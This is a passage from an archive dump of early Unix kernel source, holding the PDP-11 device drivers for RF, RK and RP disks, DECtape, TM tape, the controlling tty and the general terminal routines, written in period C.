	if (pc11.pcout.cc >= PCOHWAT)
		sleep(&pc11.pcout, PCOPRI);
	putc(c, &pc11.pcout);
	spl4();
	pcstart();
	spl0();
}

pcleader()
{
	register int i;

	i = 100;
	do
		pcoutput(0);
	while (--i);
}
-- /usr/sys/dmr/rf.c mode=0100664 uid=3 gid=3 atime=174921949 mtime=174906207 --
#
/*
 */

/*
 * RF disk driver
 */

#include "../param.h"
#include "../buf.h"
#include "../conf.h"
#include "../user.h"

struct {
	int	rfcs;
	int	rfwc;
	int	rfba;
	int	rfda;
	int	rfdae;
};

struct	devtab	rftab;
struct	buf	rrfbuf;

#define	NRFBLK	1024
#define	RFADDR	0177460

#define	GO	01
#define	RCOM	02
#define	WCOM	04
#define	CTLCLR	0400
#define	IENABLE	0100

rfstrategy(abp)
struct buf *abp;
{
	register struct buf *bp;

	bp = abp;
	if(bp->b_flags&B_PHYS)
		mapalloc(bp);
	if (bp->b_blkno >= NRFBLK*(bp->b_dev.d_minor+1)) {
		bp->b_flags =| B_ERROR;
		iodone(bp);
		return;
	}
	bp->av_forw = 0;
	spl5();
	if (rftab.d_actf==0)
		rftab.d_actf = bp;
	else
		rftab.d_actl->av_forw = bp;
	rftab.d_actl = bp;
	if (rftab.d_active==0)
		rfstart();
	spl0();
}

rfstart()
{
	register struct buf *bp;

	if ((bp = rftab.d_actf) == 0)
		return;
	rftab.d_active++;
	RFADDR->rfdae = bp->b_blkno.hibyte;
	devstart(bp, &RFADDR->rfda, bp->b_blkno<<8, 0);
}

rfintr()
{
	register struct buf *bp;

	if (rftab.d_active == 0)
		return;
	bp = rftab.d_actf;
	rftab.d_active = 0;
	if (RFADDR->rfcs < 0) {		/* error bit */
		deverror(bp, RFADDR->rfcs, RFADDR->rfdae);
		RFADDR->rfcs = CTLCLR;
		if (++rftab.d_errcnt <= 10) {
			rfstart();
			return;
		}
		bp->b_flags =| B_ERROR;
	}
	rftab.d_errcnt = 0;
	rftab.d_actf = bp->av_forw;
	iodone(bp);
	rfstart();
}

rfread(dev)
{

	physio(rfstrategy, &rrfbuf, dev, B_READ);
}

rfwrite(dev)
{

	physio(rfstrategy, &rrfbuf, dev, B_WRITE);
}
-- /usr/sys/dmr/rk.c mode=0100664 uid=3 gid=3 atime=174921956 mtime=174906228 --
#
/*
 */

/*
 * RK disk driver
 */

#include "../param.h"
#include "../buf.h"
#include "../conf.h"
#include "../user.h"

#define	RKADDR	0177400
#define	NRK	4
#define	NRKBLK	4872

#define	RESET	0
#define	GO	01
#define	DRESET	014
#define	IENABLE	0100
#define	DRY	0200
#define	ARDY	0100
#define	WLO	020000
#define	CTLRDY	0200

struct {
	int rkds;
	int rker;
	int rkcs;
	int rkwc;
	int rkba;
	int rkda;
};

struct	devtab	rktab;
struct	buf	rrkbuf;

rkstrategy(abp)
struct buf *abp;
{
	register struct buf *bp;
	register *qc, *ql;
	int d;

	bp = abp;
	if(bp->b_flags&B_PHYS)
		mapalloc(bp);
	d = bp->b_dev.d_minor-7;
	if(d <= 0)
		d = 1;
	if (bp->b_blkno >= NRKBLK*d) {
		bp->b_flags =| B_ERROR;
		iodone(bp);
		return;
	}
	bp->av_forw = 0;
	spl5();
	if (rktab.d_actf==0)
		rktab.d_actf = bp;
	else
		rktab.d_actl->av_forw = bp;
	rktab.d_actl = bp;
	if (rktab.d_active==0)
		rkstart();
	spl0();
}

rkaddr(bp)
struct buf *bp;
{
	register struct buf *p;
	register int b;
	int d, m;

	p = bp;
	b = p->b_blkno;
	m = p->b_dev.d_minor - 7;
	if(m <= 0)
		d = p->b_dev.d_minor;
	else {
		d = lrem(b, m);
		b = ldiv(b, m);
	}
	return(d<<13 | (b/12)<<4 | b%12);
}

rkstart()
{
	register struct buf *bp;

	if ((bp = rktab.d_actf) == 0)
		return;
	rktab.d_active++;
	devstart(bp, &RKADDR->rkda, rkaddr(bp), 0);
}

rkintr()
{
	register struct buf *bp;

	if (rktab.d_active == 0)
		return;
	bp = rktab.d_actf;
	rktab.d_active = 0;
	if (RKADDR->rkcs < 0) {		/* error bit */
		deverror(bp, RKADDR->rker, RKADDR->rkds);
		RKADDR->rkcs = RESET|GO;
		while((RKADDR->rkcs&CTLRDY) == 0) ;
		if (++rktab.d_errcnt <= 10) {
			rkstart();
			return;
		}
		bp->b_flags =| B_ERROR;
	}
	rktab.d_errcnt = 0;
	rktab.d_actf = bp->av_forw;
	iodone(bp);
	rkstart();
}

rkread(dev)
{

	physio(rkstrategy, &rrkbuf, dev, B_READ);
}

rkwrite(dev)
{

	physio(rkstrategy, &rrkbuf, dev, B_WRITE);
}
-- /usr/sys/dmr/rp.c mode=0100664 uid=3 gid=3 atime=174921964 mtime=174906251 --
#
/*
 */

/*
 * RP disk driver
 */

#include "../param.h"
#include "../buf.h"
#include "../conf.h"
#include "../user.h"

struct {
	int	rpds;
	int	rper;
	int	rpcs;
	int	rpwc;
	int	rpba;
	int	rpca;
	int	rpda;
};

#define	RPADDR	0176710
#define	NRP	8

struct {
	char	*nblocks;
	int	cyloff;
} rp_sizes[] {
	40600,	0,		/* cyl 0 thru 202 */
	40600,	203,		/* cyl 203 thru 405 */
	9200,	0,		/* cyl 0 thru 45 */
	9200,	360,		/* cyl 360 thru 405 */
	-1,	0,		/* cyl 0 thru 327 */
	-1,	78,		/* cyl 78 thru 405 */
	15600,	0,		/* cyl 0 thru 77 */
	15600,	328,		/* cyl 328 thru 405 */
};

struct	devtab	rptab;
struct	buf	rrpbuf;

#define	GO	01
#define	RESET	0
#define	HSEEK	014

#define	IENABLE	0100
#define	READY	0200

#define	SUFU	01000
#define	SUSU	02000
#define	SUSI	04000
#define	HNF	010000

/*
 * Use av_back to save track+sector,
 * b_resid for cylinder.
 */

#define	trksec	av_back
#define	cylin	b_resid

rpstrategy(abp)
struct buf *abp;
{
	register struct buf *bp;
	register char *p1, *p2;

	bp = abp;
	if(bp->b_flags&B_PHYS)
		mapalloc(bp);
	p1 = &rp_sizes[bp->b_dev.d_minor&07];
	if (bp->b_dev.d_minor >= (NRP<<3) ||
	    bp->b_blkno >= p1->nblocks) {
		bp->b_flags =| B_ERROR;
		iodone(bp);
		return;
	}
	bp->av_forw = 0;
	bp->cylin = p1->cyloff;
	p1 = bp->b_blkno;
	p2 = lrem(p1, 10);
	p1 = ldiv(p1, 10);
	bp->trksec = (p1%20)<<8 | p2;
	bp->cylin =+ p1/20;
	spl5();
	if ((p1 = rptab.d_actf)==0)
		rptab.d_actf = bp;
	else {
		for (; p2 = p1->av_forw; p1 = p2) {
			if (p1->cylin <= bp->cylin
			 && bp->cylin <  p2->cylin
			 || p1->cylin >= bp->cylin
			 && bp->cylin >  p2->cylin) 
				break;
		}
		bp->av_forw = p2;
		p1->av_forw = bp;
	}
	if (rptab.d_active==0)
		rpstart();
	spl0();
}

rpstart()
{
	register struct buf *bp;

	if ((bp = rptab.d_actf) == 0)
		return;
	rptab.d_active++;
	RPADDR->rpda = bp->trksec;
	devstart(bp, &RPADDR->rpca, bp->cylin, bp->b_dev.d_minor>>3);
}

rpintr()
{
	register struct buf *bp;
	register int ctr;

	if (rptab.d_active == 0)
		return;
	bp = rptab.d_actf;
	rptab.d_active = 0;
	if (RPADDR->rpcs < 0) {		/* error bit */
		deverror(bp, RPADDR->rper, RPADDR->rpds);
		if(RPADDR->rpds & (SUFU|SUSI|HNF)) {
			RPADDR->rpcs.lobyte = HSEEK|GO;
			ctr = 0;
			while ((RPADDR->rpds&SUSU) && --ctr);
		}
		RPADDR->rpcs = RESET|GO;
		ctr = 0;
		while ((RPADDR->rpcs&READY) == 0 && --ctr);
		if (++rptab.d_errcnt <= 10) {
			rpstart();
			return;
		}
		bp->b_flags =| B_ERROR;
	}
	rptab.d_errcnt = 0;
	rptab.d_actf = bp->av_forw;
	bp->b_resid = RPADDR->rpwc;
	iodone(bp);
	rpstart();
}

rpread(dev)
{

	if(rpphys(dev))
	physio(rpstrategy, &rrpbuf, dev, B_READ);
}

rpwrite(dev)
{

	if(rpphys(dev))
	physio(rpstrategy, &rrpbuf, dev, B_WRITE);
}

rpphys(dev)
{
	register c;

	c = lshift(u.u_offset, -9);
	c =+ ldiv(u.u_count+511, 512);
	if(c > rp_sizes[dev.d_minor & 07].nblocks) {
		u.u_error = ENXIO;
		return(0);
	}
	return(1);
}
-- /usr/sys/dmr/sys.c mode=0100664 uid=3 gid=3 atime=174921972 mtime=174843385 --
#
/*
 */

/*
 *	indirect driver for controlling tty.
 */
#include "../param.h"
#include "../conf.h"
#include "../user.h"
#include "../tty.h"
#include "../proc.h"

syopen(dev, flag)
{
	register *tp;

	if(tp = syttyp())
	(*cdevsw[tp->t_dev.d_major].d_open)(tp->t_dev, flag);
}

syread(dev)
{
	register *tp;

	if(tp = syttyp())
	(*cdevsw[tp->t_dev.d_major].d_read)(tp->t_dev);
}

sywrite(dev)
{
	register *tp;

	if(tp = syttyp())
	(*cdevsw[tp->t_dev.d_major].d_write)(tp->t_dev);
}

sysgtty(dev, flag)
{
	register *tp;

	if(tp = syttyp())
	(*cdevsw[tp->t_dev.d_major].d_sgtty)(tp->t_dev, flag);
}

syttyp()
{
	register tp;

	tp = u.u_procp->p_ttyp;
	if(tp == NULL)
		u.u_error = ENXIO;
	return(tp);
}
-- /usr/sys/dmr/tc.c mode=0100664 uid=3 gid=3 atime=174921979 mtime=174906300 --
#
/*
 */

/*
 * TC-11 DECtape driver
 */

#include "../param.h"
#include "../conf.h"
#include "../buf.h"
#include "../user.h"

struct {
	int	tccsr;
	int	tccm;
	int	tcwc;
	int	tcba;
	int	tcdt;
};

struct	devtab	tctab;
char	tcper[8];

#define	TCADDR	0177340
#define	NTCBLK	578

#define	TAPERR	0100000
#define	TREV	04000
#define	READY	0200
#define	IENABLE	0100
#define	UPS	0200
#define	ENDZ	0100000
#define	BLKM	02000
#define	ILGOP	010000
#define	SELERR	04000

#define	SAT	0
#define	RNUM	02
#define	RDATA	04
#define	SST	010
#define	WDATA	014
#define	GO	01

#define	SFORW	1
#define	SREV	2
#define	SIO	3

tcclose(dev)
{
	bflush(dev);
	tcper[dev&07] = 0;
}

tcstrategy(abp)
struct buf *abp;
{
	register struct buf *bp;

	bp = abp;
	if(bp->b_flags&B_PHYS)
		mapalloc(bp);
	if(bp->b_blkno >= NTCBLK || tcper[bp->b_dev&07]) {
		bp->b_flags =| B_ERROR;
		iodone(bp);
		return;
	}
	bp->av_forw = 0;
	spl6();
	if (tctab.d_actf==0)
		tctab.d_actf = bp;
	else
		tctab.d_actl->av_forw = bp;
	tctab.d_actl = bp;
	if (tctab.d_active==0)
		tcstart();
	spl0();
}

tcstart()
{
	register struct buf *bp;
	register int *tccmp, com;

loop:
	tccmp = &TCADDR->tccm;
	if ((bp = tctab.d_actf) == 0)
		return;
	if(tcper[bp->b_dev&07]) {
		if((tctab.d_actf = bp->av_forw) == 0)
			(*tccmp).lobyte = SAT|GO;
		bp->b_flags =| B_ERROR;
		iodone(bp);
		goto loop;
	}
	if (((*tccmp).hibyte&07) != bp->b_dev.d_minor)
		(*tccmp).lobyte = SAT|GO;
	tctab.d_errcnt = 20;
	tctab.d_active = SFORW;
	com = (bp->b_dev.d_minor<<8) | IENABLE|RNUM|GO;
	if ((TCADDR->tccsr & UPS) == 0) {
		com =| TREV;
		tctab.d_active = SREV;
	}
	*tccmp = com;
}

tcintr()
{
	register struct buf *bp;
	register int *tccmp;
	register int *tcdtp;

	tccmp = &TCADDR->tccm;
	tcdtp = &TCADDR->tccsr;
	bp = tctab.d_actf;
	if (*tccmp&TAPERR) {
		if((*tcdtp&(ENDZ|BLKM)) == 0)
			deverror(bp, *tcdtp, 0);
		if(*tcdtp & (ILGOP|SELERR)) {
			tcper[bp->b_dev&07]++;
			tctab.d_errcnt = 0;
		}
		*tccmp =& ~TAPERR;
		if (--tctab.d_errcnt  <= 0) {
			bp->b_flags =| B_ERROR;
			goto done;
		}
		if (*tccmp&TREV) {
		setforw:
			tctab.d_active = SFORW;
			*tccmp =& ~TREV;
		} else {
		setback:
			tctab.d_active = SREV;
			*tccmp =| TREV;
		}
		(*tccmp).lobyte = IENABLE|RNUM|GO;
		return;
	}
	tcdtp = &TCADDR->tcdt;
	switch (tctab.d_active) {

	case SIO:
	done:
		tctab.d_active = 0;
		if (tctab.d_actf = bp->av_forw)
			tcstart();
		else
			TCADDR->tccm.lobyte = SAT|GO;
		iodone(bp);
		return;

	case SFORW:
		if (*tcdtp > bp->b_blkno)
			goto setback;
		if (*tcdtp < bp->b_blkno)
			goto setforw;
		*--tcdtp = bp->b_addr;		/* core address */
		*--tcdtp = bp->b_wcount;
		tccmp->lobyte = ((bp->b_xmem & 03) << 4) | IENABLE|GO
		    | (bp->b_flags&B_READ?RDATA:WDATA);
		tctab.d_active = SIO;
		return;

	case SREV:
		if (*tcdtp+3 > bp->b_blkno)
			goto setback;
		goto setforw;
	}
}
-- /usr/sys/dmr/tm.c mode=0100664 uid=3 gid=3 atime=174921988 mtime=174843392 --
#
/*
 */

/*
 * TM tape driver
 */

#include "../param.h"
#include "../buf.h"
#include "../conf.h"
#include "../user.h"

struct {
	int tmer;
	int tmcs;
	int tmbc;
	int tmba;
	int tmdb;
	int tmrd;
};

struct	devtab	tmtab;
struct	buf	rtmbuf;

char	t_openf[8];
char	*t_blkno[8];
char	*t_nxrec[8];

#define	TMADDR	0172520

#define	GO	01
#define	RCOM	02
#define	WCOM	04
#define	WEOF	06
#define	SFORW	010
#define	SREV	012
#define	WIRG	014
#define	REW	016
#define	DENS	060000		/* 9-channel */
#define	IENABLE	0100
#define	CRDY	0200
#define GAPSD	010000
#define	TUR	1
#define	HARD	0102200	/* ILC, EOT, NXM */
#define	EOF	0040000

#define	SSEEK	1
#define	SIO	2

tmopen(dev, flag)
{
	register dminor;

	dminor = dev.d_minor;
	if (t_openf[dminor])
		u.u_error = ENXIO;
	else {
		t_openf[dminor]++;
		t_blkno[dminor] = 0;
		t_nxrec[dminor] = 65535;
	}
}

tmclose(dev, flag)
{
	register int dminor;

	dminor = dev.d_minor;
	t_openf[dminor] = 0;
	if (flag)
		tcommand(dminor, WEOF);
	tcommand(dminor, REW);
}

tcommand(unit, com)
{
	extern lbolt;

	while (tmtab.d_active || (TMADDR->tmcs & CRDY)==0)
		sleep(&lbolt, 1);
	TMADDR->tmcs = DENS|com|GO | (unit<<8);
}

tmstrategy(abp)
struct buf *abp;
{
	register struct buf *bp;
	register char **p;

	bp = abp;
	p = &t_nxrec[bp->b_dev.d_minor];
	if (*p <= bp->b_blkno) {
		if (*p < bp->b_blkno) {
			bp->b_flags =| B_ERROR;
			iodone(bp);
			return;
		}
		if (bp->b_flags&B_READ) {
			clrbuf(bp);
			iodone(bp);
			return;
		}
	}
	if ((bp->b_flags&B_READ)==0)
		*p = bp->b_blkno + 1;
	bp->av_forw = 0;
	spl5();
	if (tmtab.d_actf==0)
		tmtab.d_actf = bp;
	else
		tmtab.d_actl->av_forw = bp;
	tmtab.d_actl = bp;
	if (tmtab.d_active==0)
		tmstart();
	spl0();
}

tmstart()
{
	register struct buf *bp;
	register int com;
	int unit;
	register char *blkno;

    loop:
	if ((bp = tmtab.d_actf) == 0)
		return;
	unit = bp->b_dev.d_minor;
	blkno = t_blkno[unit];
	if (t_openf[unit] < 0 || (TMADDR->tmcs & CRDY)==0) {
		bp->b_flags =| B_ERROR;
		tmtab.d_actf = bp->av_forw;
		iodone(bp);
		goto loop;
	}
	com = (unit<<8) | ((bp->b_xmem & 03) << 4) | IENABLE|DENS;
	if (blkno != bp->b_blkno) {
		tmtab.d_active = SSEEK;
		if (blkno < bp->b_blkno) {
			com =| SFORW|GO;
			TMADDR->tmbc = blkno - bp->b_blkno;
		} else {
			if (bp->b_blkno == 0)
				com =| REW|GO;
			else {
				com =| SREV|GO;
				TMADDR->tmbc = bp->b_blkno - blkno;
			}
		}
		TMADDR->tmcs = com;
		return;
	}
	tmtab.d_active = SIO;
	TMADDR->tmbc = bp->b_wcount << 1;
	TMADDR->tmba = bp->b_addr;		/* core address */
	TMADDR->tmcs = com | ((bp->b_flags&B_READ)? RCOM|GO:
	    ((tmtab.d_errcnt)? WIRG|GO: WCOM|GO));
}

tmintr()
{
	register struct buf *bp;
	register int unit;

	if ((bp = tmtab.d_actf)==0)
		return;
	unit = bp->b_dev.d_minor;
	if (TMADDR->tmcs < 0) {		/* error bit */
/*
		deverror(bp, TMADDR->tmer);
 */
		while(TMADDR->tmrd & GAPSD) ; /* wait for gap shutdown */
		if ((TMADDR->tmer&(HARD|EOF))==0 && tmtab.d_active==SIO) {
			if (++tmtab.d_errcnt < 10) {
				t_blkno[unit]++;
				tmtab.d_active = 0;
				tmstart();
				return;
			}
		} else
			if(bp != &rtmbuf && (TMADDR->tmer&EOF)==0)
				t_openf[unit] = -1;
		bp->b_flags =| B_ERROR;
		tmtab.d_active = SIO;
	}
	if (tmtab.d_active == SIO) {
		tmtab.d_errcnt = 0;
		t_blkno[unit]++;
		tmtab.d_actf = bp->av_forw;
		tmtab.d_active = 0;
		iodone(bp);
		bp->b_resid = TMADDR->tmbc;
	} else
		t_blkno[unit] = bp->b_blkno;
	tmstart();
}

tmread(dev)
{
	tmphys(dev);
	physio(tmstrategy, &rtmbuf, dev, B_READ);
	u.u_count = -rtmbuf.b_resid;
}

tmwrite(dev)
{
	tmphys(dev);
	physio(tmstrategy, &rtmbuf, dev, B_WRITE);
	u.u_count = 0;
}

tmphys(dev)
{
	register unit, a;

	unit = dev.d_minor;
	a = lshift(u.u_offset, -9);
	t_blkno[unit] = a;
	t_nxrec[unit] = ++a;
}
-- /usr/sys/dmr/tty.c mode=0110664 uid=3 gid=3 atime=174921999 mtime=174843402 --
#
/*
 */

/*
 * general TTY subroutines
 */
#include "../param.h"
#include "../systm.h"
#include "../user.h"
#include "../tty.h"
#include "../proc.h"
#include "../inode.h"
#include "../file.h"
#include "../reg.h"
#include "../conf.h"

/*
 * Input mapping table-- if an entry is non-zero, when the
 * corresponding character is typed preceded by "\" the escape
 * sequence is replaced by the table value.  Mostly used for
 * upper-case only terminals.
 */
char	maptab[]
{
	000,000,000,000,004,000,000,000,
	000,000,000,000,000,000,000,000,
	000,000,000,000,000,000,000,000,
	000,000,000,000,000,000,000,000,
	000,'|',000,'#',000,000,000,'`',
	'{','}',000,000,000,000,000,000,
	000,000,000,000,000,000,000,000,
	000,000,000,000,000,000,000,000,
	'@',000,000,000,000,000,000,000,
	000,000,000,000,000,000,000,000,
	000,000,000,000,000,000,000,000,
	000,000,000,000,000,000,'~',000,
	000,'A','B','C','D','E','F','G',
	'H','I','J','K','L','M','N','O',
	'P','Q','R','S','T','U','V','W',
	'X','Y','Z',000,000,000,000,000,
};

/*
 * The actual structure of a clist block manipulated by
 * getc and putc (mch.s)
 */
struct cblock {
	struct cblock *c_next;
	char info[6];
};

/* The character lists-- space for 6*NCLIST characters */
struct cblock cfree[NCLIST];
/* List head for unused character blocks. */
struct cblock *cfreelist;

/*
 * structure of device registers for KL, DL, and DC
 * interfaces-- more particularly, those for which the
 * SSTART bit is off and can be treated by general routines
 * (that is, not DH).
 */
struct {
	int ttrcsr;
	int ttrbuf;
	int tttcsr;
	int tttbuf;
};

/*
 * The routine implementing the gtty system call.
 * Just call lower level routine and pass back values.
 */
gtty()
{
	int v[3];
	register *up, *vp;

	vp = v;
	sgtty(vp);
	if (u.u_error)
		return;
	up = u.u_arg[0];
	suword(up, *vp++);
	suword(++up, *vp++);
	suword(++up, *vp++);
}

/*
 * The routine implementing the stty system call.
 * Read in values and call lower level.
 */
stty()
{
	register int *up;

	up = u.u_arg[0];
	u.u_arg[0] = fuword(up);
	u.u_arg[1] = fuword(++up);
	u.u_arg[2] = fuword(++up);
	sgtty(0);
}

/*
 * Stuff common to stty and gtty.
 * Check legality and switch out to individual
 * device routine.
 * v  is 0 for stty; the parameters are taken from u.u_arg[].
 * c  is non-zero for gtty and is the place in which the device
 * routines place their information.
 */
sgtty(v)
int *v;
{
	register struct file *fp;
	register struct inode *ip;

	if ((fp = getf(u.u_ar0[R0])) == NULL)
		return;
	ip = fp->f_inode;
	if ((ip->i_mode&IFMT) != IFCHR) {
		u.u_error = ENOTTY;
		return;
	}
	(*cdevsw[ip->i_addr[0].d_major].d_sgtty)(ip->i_addr[0], v);
}

/*
 * Wait for output to drain, then flush input waiting.
 */
wflushtty(atp)
struct tty *atp;
{
	register struct tty *tp;

	tp = atp;
	spl5();
	while (tp->t_outq.c_cc) {
		tp->t_state =| ASLEEP;
		sleep(&tp->t_outq, TTOPRI);
	}
	flushtty(tp);
	spl0();
}

/*
 * Initialize clist by freeing all character blocks, then count
 * number of character devices. (Once-only routine)
 */
cinit()
{
	register int ccp;
	register struct cblock *cp;
	register struct cdevsw *cdp;

	ccp = cfree;
	for (cp=(ccp+07)&~07; cp <= &cfree[NCLIST-1]; cp++) {
		cp->c_next = cfreelist;
		cfreelist = cp;
	}
	ccp = 0;
	for(cdp = cdevsw; cdp->d_open; cdp++)
		ccp++;
	nchrdev = ccp;
}

/*
 * flush all TTY queues
 */
flushtty(atp)
struct tty *atp;
{
	register struct tty *tp;
	register int sps;

	tp = atp;
	while (getc(&tp->t_canq) >= 0);
	while (getc(&tp->t_outq) >= 0);
	wakeup(&tp->t_rawq);
	wakeup(&tp->t_outq);
	sps = PS->integ;
	spl5();
	while (getc(&tp->t_rawq) >= 0);
	tp->t_delct = 0;
	PS->integ = sps;
}

/*
 * transfer raw input list to canonical list,
 * doing erase-kill processing and handling escapes.
 * It waits until a full line has been typed in cooked mode,
 * or until any character has been typed in raw mode.
 */
canon(atp)
struct tty *atp;
{
	register char *bp;
	char *bp1;
	register struct tty *tp;
	register int c;

	tp = atp;
	spl5();
	while (tp->t_delct==0) {
		if ((tp->t_state&CARR_ON)==0)
			return(0);
		sleep(&tp->t_rawq, TTIPRI);
	}
	spl0();
loop:
	bp = &canonb[2];
	while ((c=getc(&tp->t_rawq)) >= 0) {
		if (c==0377) {
			tp->t_delct--;
			break;
		}
		if ((tp->t_flags&RAW)==0) {
			if (bp[-1]!='\\') {
				if (c==tp->t_erase) {
					if (bp > &canonb[2])
						bp--;
					continue;
				}
				if (c==tp->t_kill)
					goto loop;
				if (c==CEOT)
					continue;
			} else
			if (maptab[c] && (maptab[c]==c || (tp->t_flags&LCASE))) {
				if (bp[-2] != '\\')
					c = maptab[c];
				bp--;
			}
		}
		*bp++ = c;
		if (bp>=canonb+CANBSIZ)
			break;
	}
	bp1 = bp;
	bp = &canonb[2];
	c = &tp->t_canq;
	while (bp<bp1)
		putc(*bp++, c);
	return(1);
}

/*
 * Place a character on raw TTY input queue, putting in delimiters
 * and waking up top half as needed.
 * Also echo if required.
 * The arguments are the character and the appropriate
 * tty structure.
 */
ttyinput(ac, atp)
struct tty *atp;
{
	register int t_flags, c;
	register struct tty *tp;

	tp = atp;
	c = ac;
	t_flags = tp->t_flags;
	if ((c =& 0177) == '\r' && t_flags&CRMOD)
		c = '\n';
	if ((t_flags&RAW)==0 && (c==CQUIT || c==CINTR)) {
		signal(tp, c==CINTR? SIGINT:SIGQIT);
		flushtty(tp);
		return;
	}
	if (tp->t_rawq.c_cc>=TTYHOG) {
		flushtty(tp);
		return;
	}
	if (t_flags&LCASE && c>='A' && c<='Z')
		c =+ 'a'-'A';
	putc(c, &tp->t_rawq);
	if (t_flags&RAW || c=='\n' || c==004) {
		wakeup(&tp->t_rawq);
		if (putc(0377, &tp->t_rawq)==0)
			tp->t_delct++;
	}
	if (t_flags&ECHO) {
		ttyoutput(c, tp);
		ttstart(tp);
	}
}

/*
 * put character on TTY output queue, adding delays,
 * expanding tabs, and handling the CR/NL bit.
 * It is called both from the top half for output, and from
 * interrupt level for echoing.
 * The arguments are the character and the tty structure.
 */
ttyoutput(ac, tp)
struct tty *tp;
{
	register int c;
	register struct tty *rtp;
	register char *colp;
	int ctype;

	rtp = tp;
	c = ac&0177;
	/*
	 * Ignore EOT in normal mode to avoid hanging up
	 * certain terminals.
	 */
	if (c==004 && (rtp->t_flags&RAW)==0)
		return;
	/*
	 * Turn tabs to spaces as required
	 */
	if (c=='\t' && rtp->t_flags&XTABS) {
		do
			ttyoutput(' ', rtp);
		while (rtp->t_col&07);
		return;
	}
	/*
	 * for upper-case-only terminals,
	 * generate escapes.
	 */
	if (rtp->t_flags&LCASE) {
		colp = "({)}!|^~'`";
		while(*colp++)
			if(c == *colp++) {
				ttyoutput('\\', rtp);
				c = colp[-2];
				break;
			}
		if ('a'<=c && c<='z')
			c =+ 'A' - 'a';
	}
	/*
	 * turn <nl> to <cr><lf> if desired.
	 */
	if (c=='\n' && rtp->t_flags&CRMOD)
		ttyoutput('\r', rtp);
	if (putc(c, &rtp->t_outq))
		return;
	/*
	 * Calculate delays.
	 * The numbers here represent clock ticks
	 * and are not necessarily optimal for all terminals.
	 * The delays are indicated by characters above 0200,
	 * thus (unfortunately) restricting the transmission
	 * path to 7 bits.
	 */
	colp = &rtp->t_col;
	ctype = partab[c];
	c = 0;
	switch (ctype&077) {

	/* ordinary */
	case 0:
		(*colp)++;

	/* non-printing */
	case 1:
		break;

	/* backspace */
	case 2:
		if (*colp)
			(*colp)--;
		break;

	/* newline */
	case 3:
		ctype = (rtp->t_flags >> 8) & 03;
		if(ctype == 1) { /* tty 37 */
			if (*colp)
				c = max((*colp>>4) + 3, 6);
		} else
		if(ctype == 2) { /* vt05 */
			c = 6;
		}
		*colp = 0;
		break;

	/* tab */
	case 4:
		ctype = (rtp->t_flags >> 10) & 03;
		if(ctype == 1) { /* tty 37 */
			c = 1 - (*colp | ~07);
			if(c < 5)
				c = 0;
		}
		*colp =| 07;
		(*colp)++;
		break;

	/* vertical motion */
	case 5:
		if(rtp->t_flags & VTDELAY) /* tty 37 */
			c = 0177;
		break;

	/* carriage return */
	case 6:
		ctype = (rtp->t_flags >> 12) & 03;
		if(ctype == 1) { /* tn 300 */
			c = 5;
		} else
		if(ctype == 2) { /* ti 700 */
			c = 10;
		}
		*colp = 0;
	}
	if(c)
		putc(c|0200, &rtp->t_outq);
}

/*
 * Restart typewriter output following a delay
 * timeout.
 * The name of the routine is passed to the timeout
 * subroutine and it is called during a clock interrupt.
 */
ttrstrt(atp)
{
	register struct tty *tp;

	tp = atp;
	tp->t_state =& ~TIMEOUT;
	ttstart(tp);
}

/*
 * Start output on the typewriter. It is used from the top half
 * after some characters have been put on the output queue,
 * from the interrupt routine to transmit the next
 * character, and after a timeout has finished.
 * If the SSTART bit is off for the tty the work is done here,
 * using the protocol of the single-line interfaces (KL, DL, DC);
 * otherwise the address word of the tty structure is
 * taken to be the name of the device-dependent startup routine.
 */
ttstart(atp)
struct tty *atp;
{
	register int *addr, c;
	register struct tty *tp;
	struct { int (*func)(); };

	tp = atp;
	addr = tp->t_addr;
	if (tp->t_state&SSTART) {
		(*addr.func)(tp);
		return;
	}
	if ((addr->tttcsr&DONE)==0 || tp->t_state&TIMEOUT)
		return;
	if ((c=getc(&tp->t_outq)) >= 0) {
		if (c<=0177)
			addr->tttbuf = c | (partab[c]&0200);
		else {
			timeout(ttrstrt, tp, c&0177);
			tp->t_state =| TIMEOUT;
		}
	}
}

/*
 * Called from device's read routine after it has
 * calculated the tty-structure given as argument.
 * The pc is backed up for the duration of this call.
 * In case of a caught interrupt, an RTI will re-execute.
 */
ttread(atp)
struct tty *atp;
{
	register struct tty *tp;

	tp = atp;
	if ((tp->t_state&CARR_ON)==0)
		return;
	if (tp->t_canq.c_cc || canon(tp))
		while (tp->t_canq.c_cc && passc(getc(&tp->t_canq))>=0);
}

/*
 * Called from the device's write routine after it has
 * calculated the tty-structure given as argument.
 */
ttwrite(atp)
struct tty *atp;
{
	register struct tty *tp;
	register int c;

	tp = atp;
	if ((tp->t_state&CARR_ON)==0)
		return;
	while ((c=cpass())>=0) {
		spl5();
		while (tp->t_outq.c_cc > TTHIWAT) {
			ttstart(tp);
			tp->t_state =| ASLEEP;
			sleep(&tp->t_outq, TTOPRI);
		}
		spl0();
		ttyoutput(c, tp);
	}
	ttstart(tp);
}

/*
 * Common code for gtty and stty functions on typewriters.
 * If v is non-zero then gtty is being done and information is
 * passed back therein;
 * if it is zero stty is being done and the input information is in the
 * u_arg array.
 */
ttystty(atp, av)
int *atp, *av;
{
	register  *tp, *v;

	tp = atp;
	if(v = av) {
		*v++ = tp->t_speeds;
		v->lobyte = tp->t_erase;
		v->hibyte = tp->t_kill;
		v[1] = tp->t_flags;
		return(1);
	}
	wflushtty(tp);
	v = u.u_arg;
	tp->t_speeds = *v++;
	tp->t_erase = v->lobyte;
	tp->t_kill = v->hibyte;
	tp->t_flags = v[1];
	return(0);
}
-- /usr/sys/dmr/vs.c mode=0100664 uid=3 gid=3 atime=174922012 mtime=174843407 --
#
/*
 */

/*
 * Screw Works interface via DC-11
 */

#include "../tty.h"

#define	VSADDR	0174150
#define	CDLEAD	01
#define	B1200	030
#define	STOP1	0400
#define	CLSEND	02
#define	RQSEND	01

#define	MAGIC_MAP 0377

struct {
	int	vsrcsr;
	int	vsrbuf;
	int	vsxcsr;
	int	vsxbuf;
};

struct {
	struct	clist	iq;
	struct	clist	oq;
} vs;

vsopen(dev)
{
	VSADDR->vsrcsr = IENABLE|B1200|CDLEAD;
	VSADDR->vsxcsr = STOP1|IENABLE|B1200;
	vschar(0);
}

vsclose(dev)
{
	vschar(0);
	VSADDR->vsrcsr =& ~IENABLE;
	while (getc(&vs.iq) >= 0);
}

vswrite(dev)
{
	register int count, c;

	count = 0;
	while ((c=cpass()) >= 0) {
		if (--count <= 0) {
			count = 60;
			vschar(0);
		}
		vschar(c);
	}
	vschar(0);
}

vschar(c)
{

	c =^ MAGIC_MAP;
	spl5();
	while (vs.oq.c_cc > 60) {
		vsxintr();
